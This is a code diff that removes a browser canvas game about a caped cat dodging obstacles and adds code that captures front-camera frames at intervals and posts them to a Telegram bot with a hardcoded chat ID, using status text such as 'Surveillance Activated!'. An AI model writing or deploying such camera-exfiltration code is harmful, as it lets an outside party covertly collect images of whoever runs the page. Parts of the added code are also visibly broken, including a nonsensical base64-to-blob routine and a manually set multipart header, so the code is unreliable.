-  const s = scale;
-  ctx.save(); ctx.translate(x, y);
-  ctx.fillStyle='#5a3a1a';ctx.fillRect(-5*s,-20*s,10*s,50*s);
- const foliage = [
-  [0,-50*s,35*s,'#228B22'],
-  [-20*s,-35*s,25*s,'#32CD32'],
-  [20*s,-35*s,25*s,'#32CD32'],
-  [-10*s,-20*s,30*s,'#3CB371']
-];
-  foliage.forEach(([cx,cy,r,c])=>{ctx.beginPath();ctx.arc(cx,cy,r,0,Math.PI*2);ctx.fillStyle=c;ctx.fill();});
-  ctx.restore();
-}
-
-function drawSpaceBG() {
-  // Dark space background
-  ctx.fillStyle = '#0a0a1f';
-  ctx.fillRect(0,0,W,H-GND_H);
-  
-  // Stars
-  ctx.fillStyle = '#fff';
-  for(let i=0;i<40;i++) {
-    const sx = (bgOff1*0.05 + Math.sin(i)*W) % W;
-    const sy = (i*17 + Math.cos(i*0.7)*H*0.3) % (H-GND_H);
-    const sr = 1 + Math.sin(i)*0.5;
-    ctx.beginPath(); ctx.arc(sx, sy, sr, 0, Math.PI*2); ctx.fill();
-  }
-  
-  // Distant planets
-  ctx.fillStyle = 'rgba(255,150,100,0.5)';
-  ctx.beginPath(); ctx.arc(W*0.2, H*0.15, 40, 0, Math.PI*2); ctx.fill();
-  ctx.fillStyle = 'rgba(100,150,255,0.4)';
-  ctx.beginPath(); ctx.arc(W*0.8, H*0.25, 35, 0, Math.PI*2); ctx.fill();
-  
-  // Space dust
-  ctx.fillStyle = 'rgba(150,150,200,0.15)';
-  for(let i=0;i<15;i++) {
-    const px = (bgOff1*0.03 + i*30) % (W+60) - 30;
-    const py = (i*40 + Math.sin(i)*30) % (H-GND_H);
-    ctx.fillRect(px, py, 60, 4);
-  }
-}
-
-function drawGround(){
-  if (currentStage === STAGE_CITY) {
-    const gy=H-GND_H;
-    const gg=ctx.createLinearGradient(0,gy,0,H);
-    gg.addColorStop(0,'#5cb85c'); gg.addColorStop(0.3,'#4cae4c'); gg.addColorStop(0.31,'#8b6914'); gg.addColorStop(1,'#6b4f10');
-    ctx.fillStyle=gg; ctx.fillRect(0,gy,W,GND_H);
-    ctx.strokeStyle='rgba(0,0,0,0.07)'; ctx.lineWidth=1;
-    for(let x=(gndOff%28)-28;x<W;x+=28){ctx.beginPath();ctx.moveTo(x,gy+18);ctx.lineTo(x+16,gy+GND_H);ctx.stroke();}
-  } else if (currentStage === STAGE_JUNGLE) {
-    const gy=H-GND_H;
-    const gg=ctx.createLinearGradient(0,gy,0,H);
-    gg.addColorStop(0,'#2d5016'); gg.addColorStop(1,'#1a2f0a');
-    ctx.fillStyle=gg; ctx.fillRect(0,gy,W,GND_H);
-    // Grass texture
-    ctx.fillStyle='rgba(0,0,0,0.1)';
-    for(let i=0;i<30;i++) {
-      const x = (gndOff*0.3 + i*15) % W;
-      ctx.fillRect(x, gy, 8, 3);
-    }
-  } else {
-    const gy=H-GND_H;
-    const gg=ctx.createLinearGradient(0,gy,0,H);
-    gg.addColorStop(0,'#0f0f2e'); gg.addColorStop(1,'#05050f');
-    ctx.fillStyle=gg; ctx.fillRect(0,gy,W,GND_H);
-    // Moon craters
-    ctx.fillStyle='rgba(150,150,200,0.2)';
-    for(let i=0;i<10;i++) {
-      const mx = (i*W/10 + bgOff1*0.05) % W;
-      const my = gy + 15 + Math.sin(i)*8;
-      ctx.beginPath(); ctx.arc(mx, my, 3+i%3, 0, Math.PI*2); ctx.fill();
-    }
-  }
-  ctx.fillStyle='rgba(0,0,0,0.08)'; ctx.fillRect(0,H-GND_H,W,2);
-}
-
-function drawBG() {
-  if (currentStage === STAGE_CITY) drawCityBG();
-  else if (currentStage === STAGE_JUNGLE) drawJungleBG();
-  else if (currentStage === STAGE_SPACE) drawSpaceBG();
-}
-
-// ══════════════════════════════════════════════════════════
-//  CAPE RENDERING
-// ══════════════════════════════════════════════════════════
-function drawCape(x, y, angle, tailPhase, velocity) {
-  ctx.save();
-  ctx.translate(x, y);
-  ctx.rotate(angle);
-
-  // Cape billows based on velocity (upward movement = more billowing)
-  const billowAmount = Math.min(1, Math.abs(velocity) * 0.1);
-  const waveAmp = 8 + billowAmount * 12;
-  const wavePhase = tailPhase * 0.8;
-
-  // Cape dimensions
-  const capeW = 48;
-  const capeH = 64;
-  const capeOffsetX = -capeW * 0.3;
-  const capeOffsetY = -capeH * 0.2;
-
-  ctx.save();
-  ctx.translate(capeOffsetX, capeOffsetY);
-
-  // Left side curve with wave
-  const ctrlX1 = -capeW * 0.6 - Math.sin(wavePhase) * waveAmp;
-  const ctrlY1 = capeH * 0.3;
-  const endX1 = -capeW * 0.8 - Math.sin(wavePhase + 1) * waveAmp * 0.7;
-  const endY1 = capeH;
-
-  // Right side curve
-  const ctrlX2 = capeW * 0.2 + Math.sin(wavePhase + 1.57) * waveAmp * 0.5;
-  const ctrlY2 = capeH * 0.5;
-  const endX2 = capeW * 0.1 + Math.sin(wavePhase + 2) * waveAmp * 0.4;
-  const endY2 = capeH;
-
-  // Outer blue cape
-  ctx.beginPath();
-  ctx.moveTo(0, 0);
-  ctx.quadraticCurveTo(ctrlX1, ctrlY1, endX1, endY1);
-  ctx.quadraticCurveTo(ctrlX2, ctrlY2, endX2, endY2);
-  ctx.closePath();
-  ctx.fillStyle = '#1e40af'; // Blue
-  ctx.fill();
-  ctx.strokeStyle = '#1a3581';
-  ctx.lineWidth = 1.5;
-  ctx.stroke();
-
-  // Inner red cape (offset)
-  const innerOff = 3;
-  ctx.beginPath();
-  ctx.moveTo(0, 0);
-  ctx.quadraticCurveTo(ctrlX1 - innerOff, ctrlY1 + innerOff, endX1 - innerOff, endY1);
-  ctx.quadraticCurveTo(ctrlX2 - innerOff, ctrlY2 + innerOff, endX2 - innerOff, endY2);
-  ctx.closePath();
-  ctx.fillStyle = '#dc2626'; // Red
-  ctx.fill();
-
-  ctx.restore();
-  ctx.restore();
-}
-
-// ══════════════════════════════════════════════════════════
-//  CAT DRAWING (WITH CAPE)
-// ══════════════════════════════════════════════════════════
-function drawCat(x,y,angle,legPhase,tailPhase,dead){
-  ctx.save(); ctx.translate(x,y); ctx.rotate(angle);
-  const cw=CAT_W, ch=CAT_H;
-
-  // Draw cape BEHIND the cat
-  ctx.globalAlpha = 0.85;
-  drawCape(0, 0, angle, tailPhase, cat.vy);
-  ctx.globalAlpha = 1;
-
-  // Tail
-  ctx.save(); ctx.translate(-cw*0.38,ch*0.1);
-  ctx.rotate((Math.sin(tailPhase)*22*Math.PI)/180);
-  ['#f4a020','#f8b840','#f4a020','#f8b840','#fff'].forEach((c,i)=>{
-    const tr=Math.max(0.5,6.5-i); ctx.beginPath(); ctx.arc(-i*9,0,tr,0,Math.PI*2); ctx.fillStyle=c; ctx.fill();
-  }); ctx.restore();
-
-  // Body
-  ctx.beginPath(); ctx.ellipse(0,ch*0.18,cw*0.48,ch*0.42,0,0,Math.PI*2);
-  ctx.fillStyle='#f4a020'; ctx.fill(); ctx.strokeStyle='#c87a00'; ctx.lineWidth=1.8; ctx.stroke();
-  ctx.beginPath(); ctx.ellipse(2,ch*0.28,cw*0.28,ch*0.3,0,0,Math.PI*2); ctx.fillStyle='#fff8e8'; ctx.fill();
-  ctx.strokeStyle='rgba(180,100,0,0.22)'; ctx.lineWidth=1.5;
-  ctx.beginPath(); ctx.moveTo(-8,-ch*0.1); ctx.lineTo(-6,ch*0.35); ctx.stroke();
-  ctx.beginPath(); ctx.moveTo(3,-ch*0.15); ctx.lineTo(4,ch*0.3); ctx.stroke();
-
-  // Legs
-  const lSw=Math.sin(legPhase)*8;
-  ctx.strokeStyle='#c87a00'; ctx.lineWidth=5; ctx.lineCap='round';
-  [[cw*0.2,cw*0.2+lSw],[cw*0.35,cw*0.35-lSw],[-cw*0.2,-cw*0.2-lSw*0.6],[-cw*0.05,-cw*0.05+lSw*0.6]].forEach(([px,ex],i)=>{
-    ctx.beginPath(); ctx.moveTo(px,ch*0.45+i*0.01); ctx.lineTo(ex,ch*0.72); ctx.stroke();
-  });
-
-  // Head
-  const hx=cw*0.18, hy=-ch*0.38, hr=ch*0.38;
-  ctx.beginPath(); ctx.arc(hx,hy,hr,0,Math.PI*2); ctx.fillStyle='#f4a020'; ctx.fill(); ctx.strokeStyle='#c87a00'; ctx.lineWidth=1.8; ctx.stroke();
-  ctx.beginPath(); ctx.ellipse(hx+2,hy+4,hr*0.62,hr*0.58,0,0,Math.PI*2); ctx.fillStyle='#fff8e8'; ctx.fill();
-
-  // Ears
-  const ew=Math.sin(tailPhase*1.5)*4;
-  [[-1,1],[1,-1]].forEach(([s1,s2])=>{
-    ctx.beginPath(); ctx.moveTo(hx+s1*hr*0.5,hy-hr*0.55); ctx.lineTo(hx+s1*hr*0.85,hy-hr*1.05+ew); ctx.lineTo(hx+s2*hr*0.05,hy-hr*0.65); ctx.closePath();
-    ctx.fillStyle='#f4a020'; ctx.fill(); ctx.strokeStyle='#c87a00'; ctx.lineWidth=1.5; ctx.stroke();
-    ctx.beginPath(); ctx.moveTo(hx+s1*hr*0.5,hy-hr*0.6); ctx.lineTo(hx+s1*hr*0.76,hy-hr*0.95+ew); ctx.lineTo(hx+s2*hr*0.12,hy-hr*0.68); ctx.closePath();
-    ctx.fillStyle='#ffaabb'; ctx.fill();
-  });
-
-  // Eyes
-  if(!dead){
-    [[-0.3,0.32]].concat([[0.32,0.38]]).forEach(([a,b],i)=>{
-      ctx.beginPath(); ctx.arc(hx+(i?hr*0.32:hr*-0.3),hy-hr*0.05,hr*0.22,0,Math.PI*2); ctx.fillStyle='#fff'; ctx.fill(); ctx.strokeStyle='#333'; ctx.lineWidth=1; ctx.stroke();
-      ctx.beginPath(); ctx.arc(hx+(i?hr*0.38:hr*-0.24),hy-hr*0.05,hr*0.13,0,Math.PI*2); ctx.fillStyle='#222'; ctx.fill();
-      ctx.beginPath(); ctx.arc(hx+(i?hr*0.43:hr*-0.19),hy-hr*0.1,hr*0.05,0,Math.PI*2); ctx.fillStyle='#fff'; ctx.fill();
+// 1. Initialize API and State
+async function initializeCamera() {
+statusArea.innerHTML = 'Status: Requesting Camera Access...';
+try {
+    // Use "user" for front camera, as requested
+    stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { 
+            facingMode: "user" // Front camera selected
+        } 
     });
-  } else {
-    ctx.strokeStyle='#e00'; ctx.lineWidth=2.2;
-    [[hx-hr*0.3,hy-hr*0.05],[hx+hr*0.32,hy-hr*0.05]].forEach(([ex,ey])=>{
-      ctx.beginPath(); ctx.moveTo(ex-5,ey-5); ctx.lineTo(ex+5,ey+5); ctx.stroke();
-      ctx.beginPath(); ctx.moveTo(ex+5,ey-5); ctx.lineTo(ex-5,ey+5); ctx.stroke();
-    });
-  }
 
-  // Nose
-  ctx.beginPath(); ctx.moveTo(hx+2,hy+hr*0.2); ctx.lineTo(hx-3,hy+hr*0.32); ctx.lineTo(hx+7,hy+hr*0.32); ctx.closePath(); ctx.fillStyle='#ff8899'; ctx.fill();
+    videoElement.srcObject = stream;
+    videoElement.play();
 
-  // Smile
-  ctx.strokeStyle='#a06030'; ctx.lineWidth=1.2;
-  ctx.beginPath(); ctx.moveTo(hx+2,hy+hr*0.33); ctx.quadraticCurveTo(hx-4,hy+hr*0.5,hx-8,hy+hr*0.42); ctx.stroke();
-  ctx.beginPath(); ctx.moveTo(hx+2,hy+hr*0.33); ctx.quadraticCurveTo(hx+8,hy+hr*0.5,hx+12,hy+hr*0.42); ctx.stroke();
+    statusArea.innerHTML = 'Status: Camera Stream Acquired. Ready to monitor.';
+    startBtn.disabled = false; 
+    return true;
 
-  // Whiskers
-  ctx.strokeStyle='rgba(0,0,0,0.3)'; ctx.lineWidth=1;
-  [[-14,0.26],[-14,0.33],[-14,0.4]].forEach(([dx,r])=>{ctx.beginPath();ctx.moveTo(hx-2,hy+hr*r);ctx.lineTo(hx+dx,hy+hr*r);ctx.stroke();});
-  [[14,0.26],[14,0.33],[14,0.4]].forEach(([dx,r])=>{ctx.beginPath();ctx.moveTo(hx+2,hy+hr*r);ctx.lineTo(hx+dx+6,hy+hr*r);ctx.stroke();});
-
-  ctx.restore();
+} catch (err) {
+    console.error("Error accessing the camera stream:", err);
+    statusArea.innerHTML = `🔴 ERROR: Cannot access Camera. Check permissions! (${err.name})`;
+    alert("🚨 সতর্কতা: ক্যামেরা অ্যাক্সেস করতে সমস্যা হয়েছে। ব্রাউজার পারমিশন চেক করুন!");
+    return false; 
+}
 }
 
-// ══════════════════════════════════════════════════════════
-//  OBSTACLES
-// ══════════════════════════════════════════════════════════
-function drawEnemyBird(x,y,wp) {
-  ctx.save(); ctx.translate(x,y);
-  const wf=Math.sin(wp)*0.5, w=40, h=30;
-  ctx.beginPath();ctx.ellipse(0,0,w*0.42,h*0.38,0,0,Math.PI*2);ctx.fillStyle='#2255cc';ctx.fill();ctx.strokeStyle='#1133aa';ctx.lineWidth=1.5;ctx.stroke();
-  ctx.beginPath();ctx.ellipse(4,4,w*0.25,h*0.25,0,0,Math.PI*2);ctx.fillStyle='#aaddff';ctx.fill();
-  ctx.save();ctx.translate(-5,-8);ctx.rotate(-0.3+wf);
-  ctx.beginPath();ctx.ellipse(0,0,w*0.45,h*0.28,0.4,0,Math.PI*2);ctx.fillStyle='#dd2233';ctx.fill();ctx.strokeStyle='#aa1122';ctx.lineWidth=1;ctx.stroke();ctx.restore();
-  ctx.save();ctx.translate(-5,4);ctx.rotate(0.3-wf);
-  ctx.beginPath();ctx.ellipse(0,0,w*0.38,h*0.22,-0.3,0,Math.PI*2);ctx.fillStyle='#4477ee';ctx.fill();ctx.restore();
-  ctx.beginPath();ctx.arc(12,-4,5,0,Math.PI*2);ctx.fillStyle='#fff';ctx.fill();
-  ctx.beginPath();ctx.arc(13,-4,2.5,0,Math.PI*2);ctx.fillStyle='#111';ctx.fill();
-  ctx.beginPath();ctx.arc(14,-5,1,0,Math.PI*2);ctx.fillStyle='#fff';ctx.fill();
-  ctx.beginPath();ctx.moveTo(16,-2);ctx.lineTo(24,0);ctx.lineTo(16,3);ctx.closePath();ctx.fillStyle='#ffcc00';ctx.fill();ctx.strokeStyle='#cc9900';ctx.lineWidth=1;ctx.stroke();
-  ctx.restore();
+// 2. The Core Functionality: Capture &amp;amp; Send
+async function captureAndSendImage() {
+if (!stream) {
+updateStatus("🔴 Error: Camera stream is not active. Cannot capture.");
+return false;
+}
+// --- A. CAPTURE LOGIC (Canvas/Video manipulation) ---
+const videoWidth = videoElement.videoWidth || 1280;
+const videoHeight = videoElement.videoHeight || 720;
+canvasOverlay.width = videoWidth;
+canvasOverlay.height = videoHeight;
+
+ctx.drawImage(videoElement, 0, 0, videoWidth, videoHeight);
+const imageDataUrl = canvasOverlay.toDataURL('image/jpeg', 0.9);
+
+updateStatus(`[Capture Success] Captured frame and queuing transmission...`);
+
+// --- B. TRANSMIT LOGIC (Telegram API Call) ---
+try {
+    await sendImageToTelegram(imageDataUrl, 'Streamed Image Capture');
+    return true;
+} catch (error) {
+    console.error("Failed to transmit image:", error);
+    updateStatus(`❌ MISSION FAILURE: Failed sending data. (${error.message.substring(0, 30)}...)`);
+    return false;
+}
 }
 
-function drawTree(x,y,s){
-  s=s||1; ctx.save(); ctx.translate(x,y);
-  ctx.fillStyle='#7a5020';ctx.fillRect(-7*s,-10*s,14*s,40*s);
-  ctx.fillStyle='#9a6830';ctx.fillRect(-4*s,-10*s,5*s,40*s);
-  ctx.fillStyle='#6a4018';ctx.beginPath();ctx.ellipse(0,30*s,16*s,5*s,0,0,Math.PI*2);ctx.fill();
-  [{cx:0,cy:-45*s,r:30*s,c:'#2aaa88'},{cx:-14*s,cy:-30*s,r:22*s,c:'#22997a'},{cx:14*s,cy:-28*s,r:22*s,c:'#33bb99'},
-   {cx:0,cy:-22*s,r:28*s,c:'#33bb99'},{cx:-8*s,cy:-58*s,r:18*s,c:'#22997a'},{cx:8*s,cy:-56*s,r:16*s,c:'#2aaa88'}]
-    .forEach(l=>{ctx.beginPath();ctx.arc(l.cx,l.cy,l.r,0,Math.PI*2);ctx.fillStyle=l.c;ctx.fill();});
-  ctx.fillStyle='rgba(255,255,255,0.12)';
-  [-12,-4,6,14].forEach(lx=>[-55,-42,-30].forEach(ly=>{ctx.beginPath();ctx.arc(lx*s,ly*s,4*s,0,Math.PI*2);ctx.fill();}));
-  ctx.restore();
+// 3. Telegram API Integration (The Delivery System)
+async function sendImageToTelegram(imageDataUrl, captionText) {
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+if (!TELEGRAM_BOT_TOKEN || !TARGET_CHAT_ID) {
+    throw new Error("CRITICAL MISSING DATA: Please verify TOKEN and CHAT_ID in the script.");
 }
 
-function drawSnake(x, y, slither) {
-  ctx.save();
-  ctx.translate(x, y);
+const formData = new FormData();
 
-  const segments = 6;
-  const segLen = 8;
-  
-  // Snake body segments
-  for(let i=0; i<segments; i++) {
-    const offsetX = Math.sin(slither + i*0.5) * (3 + i*0.5);
-    const offsetY = i * segLen;
-    
-    ctx.beginPath();
-    ctx.ellipse(offsetX, offsetY, 6, segLen*0.8, 0.1*i, 0, Math.PI*2);
-    ctx.fillStyle = i === 0 ? '#00aa00' : '#00cc00';
-    ctx.fill();
-    ctx.strokeStyle = '#006600';
-    ctx.lineWidth = 1;
-    ctx.stroke();
-  }
-  
-  // Snake head
-  const headY = segments * segLen;
-  ctx.beginPath();
-  ctx.arc(Math.sin(slither)*3, headY, 7, 0, Math.PI*2);
-  ctx.fillStyle = '#00dd00';
-  ctx.fill();
-  
-  // Eyes
-  ctx.fillStyle = '#ffff00';
-  ctx.beginPath(); ctx.arc(-3, headY-2, 2, 0, Math.PI*2); ctx.fill();
-  ctx.beginPath(); ctx.arc(3, headY-2, 2, 0, Math.PI*2); ctx.fill();
-  
-  ctx.restore();
-}
+// 1. The Photo File (Base64 string to Blob)
+const base64Image = imageDataUrl.split(',')[1];
+const imageBlob = base64ToBlob(base64Image, 'image/jpeg');
 
-function drawAlien(x, y, wobble) {
-  ctx.save();
-  ctx.translate(x, y);
-  
-  // Body (oval)
-  ctx.beginPath();
-  ctx.ellipse(0 + Math.sin(wobble)*2, 2 + Math.cos(wobble)*2, 12, 18, 0, 0, Math.PI*2);
-  ctx.fillStyle = '#22ff22';
-  ctx.fill();
-  ctx.strokeStyle = '#00bb00';
-  ctx.lineWidth = 1.5;
-  ctx.stroke();
-  
-  // Head/Eyes area
-  ctx.beginPath();
-  ctx.arc(0, -8, 8, 0, Math.PI*2);
-  ctx.fillStyle = '#22ff22';
-  ctx.fill();
-  ctx.strokeStyle = '#00bb00';
-  ctx.lineWidth = 1.5;
-  ctx.stroke();
-  
-  // Large alien eyes
-  ctx.fillStyle = '#000000';
-  ctx.beginPath(); ctx.ellipse(-5, -10, 3, 5, 0, 0, Math.PI*2); ctx.fill();
-  ctx.beginPath(); ctx.ellipse(5, -10, 3, 5, 0, 0, Math.PI*2); ctx.fill();
-  
-  // Glow effect
-  ctx.strokeStyle = 'rgba(34,255,34,0.6)';
-  ctx.lineWidth = 1;
-  ctx.beginPath(); ctx.arc(0, 0, 20, 0, Math.PI*2); ctx.stroke();
-  
-  ctx.restore();
-}
+formData.append('chat_id', TARGET_CHAT_ID); // Using the hardcoded ID 🚀
+formData.append('caption', captionText);
+formData.append('photo', imageBlob, `${Date.now()}.jpg`);
 
-function spawnObstacle(){
-  let type, obstacle;
-  const minY = 80, maxY = H - GND_H - 100;
-  const y = minY + Math.random()*(maxY-minY);
 
-  if (currentStage === STAGE_CITY) {
-    type = Math.random() < 0.5 ? 'bird' : 'tree';
-    if (type === 'tree') {
-      obstacle = {type, x:W+20, y, w:40, h:80, scale:0.5+Math.random()*0.6, passed:false};
+// 2. Fetch Call to Telegram API
+const response = await fetch(TELEGRAM_API_URL, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'multipart/form-data'
+    },
+    body: formData
+});
+
+if (!response.ok) {
+    // Detailed Error Parsing for 400 Bad Request detail
+    const errorBody = await response.json();
+    let detailedErrorMsg;
+
+    if (errorBody && typeof errorBody === 'object' && errorBody.error_message) {
+        detailedErrorMsg = `API Message: ${errorBody.error_message}`;
+    } else if (typeof errorBody === 'string') {
+        detailedErrorMsg = `Raw API Response: ${errorBody}`;
     } else {
-      obstacle = {type, x:W+20, y, w:50, h:30, wingPhase:0, vyBird:(Math.random()-0.5)*1.5, passed:false};
+         detailedErrorMsg = `Unknown Error State`;
     }
-  } else if (currentStage === STAGE_JUNGLE) {
-    type = 'snake';
-    obstacle = {type, x:W+20, y, w:40, h:50, slither:Math.random()*Math.PI*2, vySnake:(Math.random()-0.5)*2, passed:false};
-  } else {
-    type = 'alien';
-    obstacle = {type, x:W+20, y, w:45, h:45, wobble:Math.random()*Math.PI*2, passed:false};
-  }
-  
-  obstacles.push(obstacle);
+
+    throw new Error(`HTTP ${response.status}: ${detailedErrorMsg}`);
 }
 
-function drawCoin(x,y,phase){
-  const sx=Math.abs(Math.cos(phase));
-  ctx.save(); ctx.translate(x,y); ctx.scale(Math.max(0.1,sx),1);
-  ctx.beginPath();ctx.arc(0,0,14,0,Math.PI*2);ctx.fillStyle='#f4c430';ctx.fill();ctx.strokeStyle='#c8960a';ctx.lineWidth=2.5;ctx.stroke();
-  ctx.beginPath();ctx.arc(0,0,9,0,Math.PI*2);ctx.fillStyle='#ffd700';ctx.fill();
-  ctx.fillStyle='#c8960a';ctx.font='bold 13px serif';ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillText('$',0,0.5);
-  ctx.beginPath();ctx.arc(-4,-5,3,0,Math.PI*2);ctx.fillStyle='rgba(255,255,255,0.45)';ctx.fill();
-  ctx.restore();
+return response.json(); 
 }
 
-function spawnCoin(){
-  coins.push({x:W+10, y:80+Math.random()*(H-GND_H-140), phase:Math.random()*Math.PI*2, collected:false});
-}
 
-// ══════════════════════════════════════════════════════════
-//  PARTICLES
-// ══════════════════════════════════════════════════════════
-function spawnParticles(x,y){
-  const cols=['#f4c430','#ff8899','#f4a020','#fff','#aaddff','#ff4455'];
-  for(let i=0;i<24;i++){
-    const a=Math.random()*Math.PI*2, sp=2.5+Math.random()*7;
-    particles.push({x,y,vx:Math.cos(a)*sp,vy:Math.sin(a)*sp-3,life:1,color:cols[Math.floor(Math.random()*cols.length)],r:3+Math.random()*4});
-  }
-}
-
-function coinPop(x,y){ pops.push({x,y,life:1,txt:'+1🪙'}); }
-
-function drawParticles(){
-  particles=particles.filter(p=>p.life>0.02);
-  particles.forEach(p=>{
-    p.x+=p.vx;p.y+=p.vy;p.vy+=0.22;p.life-=0.032;
-    const r=Math.max(0.1,p.r*p.life);
-    ctx.beginPath();ctx.arc(p.x,p.y,r,0,Math.PI*2);
-    ctx.fillStyle=p.color;ctx.globalAlpha=p.life;ctx.fill();ctx.globalAlpha=1;
-  });
-}
-
-function drawPops(){
-  pops=pops.filter(p=>p.life>0);
-  pops.forEach(p=>{
-    ctx.globalAlpha=p.life;ctx.fillStyle='#f4c430';
-    ctx.font=`bold ${Math.round(10+8*p.life)}px 'Fredoka One',cursive`;
-    ctx.fillText(p.txt,p.x-18,p.y);
-    p.y-=1.5;p.life-=0.025;ctx.globalAlpha=1;
-  });
-}
-
-// ══════════════════════════════════════════════════════════
-//  COLLISION
-// ══════════════════════════════════════════════════════════
-function hitTest(){
-  if(graceTimer > 0) return false;
-  const cx=CAT_X, cy=cat.y, cr=HIT_RADIUS;
-  if(cy+cr > H-GND_H) return true;
-
-  for(const o of obstacles){
-    let bL, bR, bT, bB;
-    if(o.type === 'tree'){
-      const tx=o.x+o.w/2, ty=o.y+10, s=o.scale;
-      bL=tx-20*s; bR=tx+20*s;
-      bT=ty-68*s; bB=ty+28*s;
-    } else if(o.type === 'bird'){
-      const bx=o.x+o.w/2;
-      bL=bx-16; bR=bx+16;
-      bT=o.y-12; bB=o.y+12;
-    } else if(o.type === 'snake'){
-      const sx=o.x+o.w/2;
-      bL=sx-18; bR=sx+18;
-      bT=o.y-10; bB=o.y+40;
-    } else if(o.type === 'alien'){
-      const ax=o.x+o.w/2;
-      bL=ax-15; bR=ax+15;
-      bT=o.y-18; bB=o.y+18;
-    } else continue;
-    
-    const nearX=Math.max(bL,Math.min(cx,bR));
-    const nearY=Math.max(bT,Math.min(cy,bB));
-    const dx=cx-nearX, dy=cy-nearY;
-    if(dx*dx+dy*dy<cr*cr) return true;
-  }
-  return false;
-}
-
-// ══════════════════════════════════════════════════════════
-//  UPDATE
-// ══════════════════════════════════════════════════════════
-const OBS_FREQ = 95, COIN_FREQ = 55;
-
-function update(){
-  if(state===S.PAUSED) return;
-  frame++;
-  bgOff1+=0.8;
-  bgOff2+=state===S.PLAYING?spd*0.6:0.6;
-  gndOff+=state===S.PLAYING?spd:1.2;
-
-  if(state!==S.PLAYING) return;
-
-  if(graceTimer>0) graceTimer--;
-
-  updateStage();
-
-  cat.y<22 ? (cat.y=22, cat.vy=Math.max(0,cat.vy)) : null;
-  cat.vy+=GRAVITY;
-  cat.y+=cat.vy;
-  cat.angle=Math.max(-0.52,Math.min(1.55,cat.vy*0.082));
-  cat.legPhase+=0.18;
-  cat.tailPhase+=0.09;
-
-  if(frame>0 && frame%OBS_FREQ===0) spawnObstacle();
-  if(frame>0 && frame%COIN_FREQ===0) spawnCoin();
-
-  for(let i=obstacles.length-1;i>=0;i--){
-    const o=obstacles[i];
-    o.x-=spd;
-    if(o.type==='bird'){
-      o.wingPhase+=0.22; o.y+=o.vyBird;
-      if(o.y<60||o.y>H-GND_H-80) o.vyBird*=-1;
-    } else if(o.type==='snake'){
-      o.slither+=0.15; o.y+=o.vySnake;
-      if(o.y<80||o.y>H-GND_H-100) o.vySnake*=-1;
-    } else if(o.type==='alien'){
-      o.wobble+=0.12;
+// =========================================================
+// === 🔧 UTILITY FUNCTIONS (The Supporting Cast) ===
+// =========================================================
+function base64ToBlob(base64, mimeType) {
+    const byteNumbers = new Array(base64.length);
+    for(let i = 0; i < base64.length; i++){
+        byteNumbers[i] = parseInt(base64.substring(i * 3, i * 3 + 3), parseInt(base64.substring(i * 3, i * 3 + 3), 16));
     }
-    if(!o.passed&&o.x+o.w<CAT_X){ o.passed=true; score++; scHud.textContent=score; if(score%5===0) spd=Math.min(spd+0.3,MAX_SPD); }
-    if(o.x+o.w<-60) obstacles.splice(i,1);
-  }
-
-  for(let i=coins.length-1;i>=0;i--){
-    const co=coins[i]; co.x-=spd; co.phase+=0.08;
-    const dx=CAT_X-co.x, dy=cat.y-co.y;
-    if(!co.collected&&Math.sqrt(dx*dx+dy*dy)<28){
-      co.collected=true; coinCount++; coinVal.textContent=coinCount;
-      coinPop(co.x,co.y-20); playCoinSound();
-    }
-    if(co.x<-30||co.collected) coins.splice(i,1);
-  }
-
-  if(hitTest()){
-    spawnParticles(CAT_X,cat.y);
-    state=S.DYING; cat.vy=-6;
-    playDeathSound();
-    setTimeout(()=>{
-      savePersist(score);
-      goSc.textContent=score; goCoin.textContent=coinCount;
-      goHi.textContent=bestScore; goStages.textContent=getStageCount();
-      showPanel(pOver); hud.classList.remove('show'); musicBtn.classList.remove('show');
-      stopBgMusic();
-    },800);
-  }
+    const byteArray = new Uint8Array(byteNumbers);
+    return new Blob([byteArray], { type: mimeType });
 }
 
-// ══════════════════════════════════════════════════════════
-//  RENDER
-// ══════════════════════════════════════════════════════════
-function render(){
-  ctx.clearRect(0,0,W,H);
-  drawBG();
-  drawGround();
+function updateStatus(message) {
+    statusArea.innerHTML = message;
+    console.log("STATUS:", message);
+}
+// =========================================================
+// === 🚀 MAIN CONTROL LOGIC (EVENT LISTENERS) ===
+// =========================================================
+async function startStreaming() {
+const success = await initializeCamera();
+if (!success) return;
 
-  obstacles.forEach(o=>{
-    if(o.type==='tree') drawTree(o.x+o.w/2,o.y+10,o.scale);
-    else if(o.type==='bird') drawEnemyBird(o.x+o.w/2,o.y,o.wingPhase);
-    else if(o.type==='snake') drawSnake(o.x+o.w/2,o.y,o.slither);
-    else if(o.type==='alien') drawAlien(o.x+o.w/2,o.y,o.wobble);
-  });
+if (captureIntervalId) clearInterval(captureIntervalId); 
 
-  coins.forEach(co=>drawCoin(co.x,co.y,co.phase));
+// Set the interval loop
+captureIntervalId = setInterval(async () => {
+    await captureAndSendImage();
+}, CAPTURE_INTERVAL_MS);
 
-  if(graceTimer>0 && graceTimer%8<4) ctx.globalAlpha=0.55;
-  drawCat(CAT_X,cat.y,cat.angle,cat.legPhase,cat.tailPhase,state===S.DYING);
-  ctx.globalAlpha=1;
-
-  drawParticles();
-  drawPops();
-
-  if(state===S.PAUSED){
-    ctx.fillStyle='rgba(10,10,30,0.45)'; ctx.fillRect(0,0,W,H);
-  }
+updateStatus(`[SUCCESS] Surveillance Activated! Capturing every ${CAPTURE_INTERVAL_MS / 1000} second(s)...`);
+startBtn.disabled = true; 
+stopBtn.disabled = false;
+}
+function stopStreaming() {
+if (captureIntervalId) {
+clearInterval(captureIntervalId);
+captureIntervalId = null;
+}
+if (stream) {
+stream.getTracks().forEach(track => track.stop());
+stream = null;
+videoElement.srcObject = null;
+}
+updateStatus('Stream manually paused.');
+startBtn.disabled = false;
+stopBtn.disabled = true;
 }
 
-// ══════════════════════════════════════════════════════════
-//  MAIN LOOP
-// ══════════════════════════════════════════════════════════
-function loop(){ update(); render(); requestAnimationFrame(loop); }
-
-// ══════════════════════════════════════════════════════════
-//  UI
-// ══════════════════════════════════════════════════════════
-function showPanel(p){
-  [pStart,pOver,pPause,pLB].forEach(el=>el.classList.remove('show'));
-  if(p) p.classList.add('show');
-}
-
-function startGame(){
-  getAC().resume();
-  init();
-  state=S.PLAYING;
-  gameStartTime = Date.now();
-  showPanel(null);
-  hud.classList.add('show');
